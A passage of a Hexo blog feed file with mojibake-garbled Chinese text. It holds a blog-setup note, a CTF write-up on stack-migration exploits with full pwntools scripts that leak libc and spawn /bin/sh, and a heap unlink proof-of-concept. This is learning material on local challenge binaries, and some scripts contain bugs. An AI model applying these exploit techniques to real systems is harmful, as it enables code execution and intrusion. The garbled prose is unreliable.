src="C:%5CUsers%5Czhz%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200225185321610.png" alt="image-20200225185321610"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ­å»ºåšå®¢çš„ä¸€äº›å‘</title>
      <link href="/2019/10/18/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
      <url>/2019/10/18/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>æ ¹æ®æ­¤é“¾æ¥è¿›è¡Œåšå®¢çš„æ­å»º<a href="https://blog.csdn.net/weixin_39879178/article/details/80319392" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39879178/article/details/80319392</a><br>ä½†æ˜¯å…¶ä¸­è¸©äº†ä¸å°‘çš„å‘ï¼Œå‘ç°æ­¤é“¾æ¥ä¸­æœ‰äº›å›¾ç‰‡å­˜åœ¨äº›è®¸é—®é¢˜</p><p><strong>1.åœ¨è¿›è¡Œhexo initçš„æ—¶å€™</strong><br><img src="https://img-blog.csdnimg.cn/20191003223041562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poel9fX18=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å®é™…ä¸Šï¼Œä½ ä¸åº”è¯¥åœ¨æ ¹ç›®å½•è¿›è¡Œhexo initæ“ä½œï¼Œè€Œæ˜¯åº”è¯¥è¿›å…¥ä½ çš„blog/Hexoæ–‡ä»¶é‡Œè¿›è¡Œ hexo initæ“ä½œã€‚<br>ä¸ç„¶ï¼Œä½ å°±ä¼šå‡ºç°hexo no foundã€‚</p><p><strong>2.åœ¨è¿›è¡Œæ·»åŠ åˆ†ç±»é“¾æ¥çš„æ—¶å€™</strong><br>ç½‘ä¸Šå¾ˆå¤šåšå®¢éƒ½æ˜¯ç›´æ¥è®©ä½ new pageä¸€ä¸ªcategoriesï¼Œä½†æ˜¯è¯·æ³¨æ„ï¼ï¼ï¼ï¼ï¼<br><img src="https://img-blog.csdnimg.cn/20191003223424930.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…ˆè§‚å¯Ÿä½ çš„githubæ–‡ä»¶å¤¹é‡Œcategoriesé‡Œçš„å¤§å°å†™ï¼Œæ ¹æ®å¤§å°å†™æ¥ä¿®æ”¹D:\blog\Hexo\themes\nexté‡Œçš„_config.ymlæ–‡ä»¶å¤¹é‡Œçš„categoriesé€‰é¡¹ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹äºæ ˆè¿ç§»æŠ€æœ¯çš„å­¦ä¹ </title>
      <link href="/2019/10/18/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/18/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="migration"><a href="#migration" class="headerlink" title="migration"></a>migration</h3><p>æ ˆè¿ç§»å…¶å®å°±æ˜¯åˆ©ç”¨ leave ret<br>å› ä¸º leave ret å®é™…ä¸Šå°±æ˜¯  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    esp  ebp</span><br><span class="line">       pop  ebp  //å°†æ ˆä¸­espçš„å€¼å¼¹ç»™ebp~</span><br><span class="line">       pop  eip  //ä¸€ç§æ¸…æ ˆçš„è¡Œä¸ºï¼ŒåŒæ—¶æ§åˆ¶ç¨‹åºæµ~</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´ï¼Œè¿›è¡Œäº†ä¸¤æ¬¡çš„leaveæ“ä½œã€‚(ç¨‹åºæœ¬èº«ä¸€æ¬¡ï¼Œä½ è‡ªå·±æ„é€ çš„ä¸€æ¬¡)mov esp,ebp; pop ebp; mov esp,ebp; pop ebpã€‚</p><p>ç¬¬ä¸€æ¬¡çš„leaveæ“ä½œå°†espæŒ‡å‘ebpåŸºå€ï¼ŒebpæŒ‡å‘æ ˆä¸­ä¼ªé€ çš„ebpå¤„ã€‚</p><p>ç¬¬äºŒæ¬¡çš„leaveæ“ä½œå°†espæŒ‡å‘ä¼ªé€ çš„ebpå¤„ï¼ˆå’Œæ±‡ç¼–ä¸­å¼€è¾Ÿæ ˆç©ºé—´ä¸€æ ·ï¼Œebpä¸espå…ˆåŒæ—¶æŒ‡å‘ä¸€ä¸ªåœ°æ–¹ï¼Œç„¶åå¡«å……(esp-4)ï¼‰æœ€åçš„pop ebpä¼šå¯¼è‡´esp+4ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ çš„æ—¶å€™å°†æ•°æ®æ”¾åˆ°esp+4çš„åœ°æ–¹ã€‚</p><p>è¿™æ˜¯æˆ‘æ‰‹åŠ¨è¿›è¡Œçš„æ ˆè¿ç§»ï¼Œä½†æ˜¯â€¦ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œputsæ¥æ”¶æ•°æ®æ¥æ”¶ä¸åˆ°ï¼Œæœ›å¤§ä½¬æŒ‡æ­£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">pop1_ret = <span class="number">0x0804836d</span></span><br><span class="line">pop3_ret = <span class="number">0x08048569</span></span><br><span class="line"><span class="comment">#################### change stack space#####################</span></span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#################### leak libc address ########################</span></span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">puts_add = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_add - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address--&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line">system_add = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system address --&gt;[%s]"</span>%hex(system_add)</span><br><span class="line"><span class="comment">######################  get shell ###########################</span></span><br><span class="line">payload = p32(buf) + p32(read_plt) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + <span class="string">'bbbb'</span> + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>psï¼šæ‰¾åˆ°é—®é¢˜æ‰€åœ¨äº†ï¼Œç¬¬ä¸€æ¬¡éœ€è¦sendï¼Œsendlineå¤šäº†â€™\x0aâ€™ï¼Œå¥½åƒå°±å‡ºç°é—®é¢˜äº†</p><p>ä¸‹é¢æ˜¯åˆ©ç”¨ropæ¨¡å—è¿›è¡Œçš„ï¼Œè¿™å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#! -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'migration'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x8048380</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0804836d</span></span><br><span class="line">puts_got = <span class="number">0x8049ff0</span></span><br><span class="line"><span class="comment">#buf = 0x0804b000-0x200</span></span><br><span class="line"><span class="comment">#buf2 = buf + 0x100</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">100</span>])</span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">sh.sendline(rop)</span><br><span class="line">sh.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">puts_off = <span class="number">0x5fca0</span></span><br><span class="line">libc = u32(r.recv(<span class="number">4</span>)) - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc:"</span>,hex(libc)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">system_off = <span class="number">0x3ada0</span></span><br><span class="line">system = libc + system_off</span><br><span class="line">rop2 = flat([buf,system,<span class="number">0</span>,buf2+<span class="number">16</span>,<span class="string">"/bin/sh"</span>])</span><br><span class="line">sh.sendline(rop2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h3><p>è¿™é¢˜ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œå­¦è‰ºä¸ç²¾ï¼Œåœ¨æœ€åè¿›è¡Œreadè¯»å…¥çš„æ—¶å€™ï¼Œæˆ‘å¿˜è®°åŠ ä¸Šleave_retï¼Œå°†ç¨‹åºæµåŠ«æŒåˆ°read(addr)åœ°æ–¹äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./spwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./spwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line">pop1_ret = <span class="number">0x080485ab</span></span><br><span class="line">pop3_ret = <span class="number">0x080485a9</span></span><br><span class="line">buf = elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss()+<span class="number">0x400</span></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">shellcode = <span class="number">0x0804A300</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804A380</span>) </span><br><span class="line">payload += p32(elf.plt[<span class="string">'write'</span>]) </span><br><span class="line">payload += p32(leave_ret) </span><br><span class="line">payload += p32(<span class="number">1</span>) </span><br><span class="line">payload += p32(elf.got[<span class="string">'write'</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">0x80</span> - <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x0804A400</span>)</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(leave_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804A400</span>)</span><br><span class="line">payload += p32(<span class="number">20</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p32(shellcode) + p32(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">write_addr= u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">"write :"</span>+hex(write_addr))</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">log.success(<span class="string">"libc_base :"</span>+hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system :"</span>+hex(system_addr))</span><br><span class="line">log.success(<span class="string">"binsh :"</span>+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><p>emmmmmï¼Œè®¤çœŸè®°å½•ä¸€æ¬¡æ ˆè¿ç§»ï¼Œåšäº†è¿™é¢˜ï¼Œå‘ç°å¯¹äºæ ˆè¿ç§»æŠ€æœ¯äº†è§£çš„è¿˜æ˜¯ä¸å¤Ÿé€å½»ï¼Œæ•…æ­¤è¯¦ç»†è®°å½•ä¸¤ç§æ‰“æ³•ã€‚</p><p>å…ˆæå‡ºä¸€ç‚¹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œleakçš„ebpåœ°å€å’Œè°ƒè¯•è¿‡ç¨‹ä¸­åœ¨æ ˆç©ºé—´è¦†ç›–ebpçš„åœ°å€å·®äº†0x10ï¼Œä¹Ÿå°±æ˜¯leak_ebp_addr - 0x10 = æ ˆç©ºé—´ebp_addr</p><h4 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh =process(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line"></span><br><span class="line">sys_plt=<span class="number">0x8048400</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">0x08</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">ebp = u32(sh.recv(<span class="number">4</span>)) //è¿™é‡Œå› ä¸ºå‘ç°memsetå‡½æ•°åªæ¸…ç†äº†æ ˆç©ºé—´<span class="number">0x20</span>çš„ç©ºé—´ï¼Œè§‚å¯Ÿåˆ°ebpè¿˜åœ¨ï¼</span><br><span class="line"><span class="keyword">print</span> (hex(ebp))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload = (<span class="string">'a'</span>*<span class="number">8</span>+p32(ebp<span class="number">-0x24</span>)+<span class="string">'bbbb'</span>+p32(sys_plt)+<span class="string">'cccc'</span> + p32(ebp<span class="number">-0x1c</span>)+<span class="string">'/bin/sh\x00'</span>).ljust(<span class="number">0x28</span>,<span class="string">'p'</span>)+p32(ebp<span class="number">-0x2c</span>)</span><br><span class="line">//æ­¤å¤„å°†ebpè¦†ç›–ä¸ºebp<span class="number">-0x2c</span>ï¼ˆpwndbgè°ƒè¯•çš„ï¼‰ï¼Œå°†æ ˆç§»åŠ¨åˆ°äº†bbbbå‰é¢ï¼Œæ­¤æ—¶çš„ebpå°±æ˜¯bbbbï¼Œé‚£ä¹ˆretå°±æ˜¯sys_pltã€‚ç„¶åå‚æ•°å°±æ˜¯p32(ebp<span class="number">-0x1c</span>)æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œå³/bin/shã€‚ï¼ˆè‡³äºä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨<span class="string">'cccc'</span>çš„åé¢ç›´æ¥å†™å…¥<span class="string">'/bin/sh\x00'</span>ï¼Œæˆ‘æƒ³äº†æƒ³ï¼Œè¿™æ˜¯<span class="number">32</span>ä½ï¼Œå—¨ï¼Œ<span class="number">4</span>å­—èŠ‚çš„å‚æ•°ï¼Œ<span class="number">8</span>å­—èŠ‚çš„binshä¸è¡Œï¼Œè½¬ä¸ºæŒ‡é’ˆå°±æ²¡é—®é¢˜äº†ã€‚</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">0x08</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">ebp = u32(sh.recv(<span class="number">4</span>)) //leakæ€è·¯ä¸€æ ·</span><br><span class="line">print(hex(ebp))</span><br><span class="line"></span><br><span class="line">addr = ebp<span class="number">-0x38</span> //è¿™é‡Œå°±ç›´æ¥æŒ‰æˆ‘ä»¬gdbé‡Œæ‰€è°ƒè¯•åˆ°çš„ï¼ŒçœŸå®åç§»ä¸º<span class="number">0x38</span>ï¼Œç›´æ¥åˆ°å˜é‡è¾“å…¥å¤„ã€‚</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">'system'</span>])+<span class="string">'aaaa'</span>+p32(addr+<span class="number">0x10</span>)</span><br><span class="line">payload+= <span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*<span class="number">0x10</span>+p32(addr)+p32(<span class="number">0x80485fd</span>)</span><br><span class="line">//é‚£ä¹ˆæ­¤å¤„å°±æ˜¯<span class="string">'aaaa'</span>ä¸ºebpï¼Œretè¿˜æ˜¯<span class="string">'system'</span>ã€‚</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn unlink</title>
      <link href="/2019/10/18/pwn%20%20unlink/"/>
      <url>/2019/10/18/pwn%20%20unlink/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ä¸ªå®éªŒçš„poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ptr1[<span class="number">1</span>] = <span class="number">0x81</span>;</span><br><span class="line">ptr1[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x18</span>;</span><br><span class="line">ptr1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line">ptr2[<span class="number">-2</span>] = <span class="number">0x80</span>;</span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p before free\n"</span>,target);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p after free\n"</span>,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pid = %d\n"</span>,getpid());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++å­¦ä¹ ç¬”è®°ï¼ˆé¢å‘è¿‡ç¨‹çš„ç¼–ç¨‹é£æ ¼ï¼‰</title>
      <link href="/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E7%9A%84%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%EF%BC%89/"/>
      <url>/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E7%9A%84%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%EF%BC%89/</url>
      
